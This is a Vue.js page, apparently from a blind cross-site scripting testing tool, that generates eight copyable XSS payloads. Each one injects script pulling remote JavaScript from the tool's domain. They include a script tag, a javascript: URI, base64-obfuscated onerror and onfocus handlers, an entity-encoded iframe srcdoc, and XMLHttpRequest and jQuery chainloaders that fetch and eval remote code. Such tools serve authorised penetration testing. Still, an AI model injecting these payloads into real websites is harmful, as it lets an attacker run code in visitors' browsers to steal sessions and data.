<template>
    <div>
        <div class="row">
            <div class="col-12">
                <card class="xss-card-container">
                    <div class="row pl-4 pr-4 p-2" style="display: block;">
                        <div>
                            <h1><i class="fas fa-file-code"></i> XSS Payloads</h1>
                            {{this.http_warning}}
                        </div>
                        <card v-for="payload in payloads">
                            <h4 class="card-title" v-html="payload.title"></h4>
                            <h6 class="card-subtitle mb-2 text-muted">{{payload.description}}</h6>
                            <p class="card-text">
                                <base-input type="text" v-bind:value="payload.func()" placeholder="..."></base-input>
                            </p>
                            <base-button type="primary" v-clipboard:copy="payload.func()"><i class="far fa-copy"></i> Copy Payload</base-button>
                        </card>
                    </div>
                </card>
            </div>
        </div>
    </div>
</template>
<script>
import config from '@/config';
import Vue from "vue";
import api_request from '@/libs/api.js';
import router from "@/router/index";
import utils from '@/libs/utils';
const html_encode = utils.html_encode;
const urlsafe_base64_encode = utils.urlsafe_base64_encode;

export default {
    data() {
        return {
            payloads: [
                {
                    'func': this.basic_script,
                    'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
                    'description': 'Classic payload',
                },
                {
                    'func': this.javascript_uri,
                    'title': '<code>javascript:</code> URI Payload',
                    'description': 'Link-based XSS',
                },
                {
                    'func': this.input_onfocus,
                    'title': '<code>&lt;input&gt;</code> Tag Payload',
                    'description': 'HTML5 input-based payload',
                },
                {
                    'func': this.image_onerror,
                    'title': '<code>&lt;img&gt;</code> Tag Payload',
                    'description': 'Image-based payload',
                },
                {
                    'func': this.video_source,
                    'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
                    'description': 'Video-based payload',
                },
                {
                    'func': this.iframe_srcdoc,
                    'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
                    'description': 'iframe-based payload',
                },
                {
                    'func': this.xmlhttprequest_load,
                    'title': 'XMLHttpRequest Payload',
                    'description': 'Inline execution chainload payload',
                },
                {
                    'func': this.jquery_chainload,
                    'title': '<code>$.getScript()</code> (jQuery) Payload',
                    'description': 'Chainload payload for sites with jQuery',
                },
            ],

            base_domain: '',
        }
    },
    watch: {},
    methods: {
        js_attrib: function() {
            return 'var a=document.createElement("script");a.src="' + location.protocol + '//' + this.base_domain + '";document.body.appendChild(a);';
        },
        basic_script: function() {
            return "\"><script src=\"" + location.protocol + "//" + this.base_domain + "\"><\/script>";
        },
        javascript_uri: function() {
            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'" + location.protocol + "//" + this.base_domain + "\\';document.body.appendChild(a)')";
        },
        input_onfocus: function() {
            return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
        },
        image_onerror: function() {
            return "\"><img src=x id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " onerror=eval(atob(this.id))>";;
        },
        video_source: function() {
            return "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + ">";
        },
        iframe_srcdoc: function() {
            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;" + (location.protocol === "https:" ? "&#115;" : "") + "&#58;&#47;&#47;" + this.base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
        },
        xmlhttprequest_load: function() {
            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "' + location.protocol + '//' + this.base_domain + '");a.send();<\/script>'
        },
        jquery_chainload: function() {
            return '<script>$.getScript("' + location.protocol + '//' + this.base_domain + '")<\/script>';
        },
    },
    computed: {},
    components: {},
    async mounted() {
        // For debugging
        window.app = this;

        // Base domain
        this.base_domain = api_request.BASE_DOMAIN;

        if (location.protocol !== "https:") {
            this.http_warning = "You are not using HTTPS all your payloads reflect that. If you meant to have HTTPS please visit the admin page with HTTPS";
        } else {
            this.http_warning = "";
        }
    },
    beforeDestroy() {}
};
</script>
<style>
.control-label {
    color: #d3d3d7 !important;
    display: inline;
}
</style>